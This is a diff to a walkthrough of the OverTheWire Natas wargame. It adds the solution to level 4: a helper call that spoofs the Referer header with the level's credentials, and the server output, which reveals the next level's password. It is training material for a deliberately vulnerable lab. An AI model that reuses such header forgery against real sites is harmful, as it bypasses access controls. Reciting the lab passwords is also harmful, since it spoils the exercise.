@@ -142,6 +142,19 @@ https://overthewire.org/wargames/natas/natas4.html
 > URL:      http://natas4.natas.labs.overthewire.org
 
 ```python
+# natasX.natasX(4, "Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ")
+natasX.natasX(4, "Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ", "", {'referer': "http://natas5.natas.labs.overthewire.org/"})
+```
+
+**Output**
+
+```html
+<div id="content">
+
+Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
+<br/>
+<div id="viewsource"><a href="index.php">Refresh page</a></div>
+</div>
 ```
 
 ## Natas5
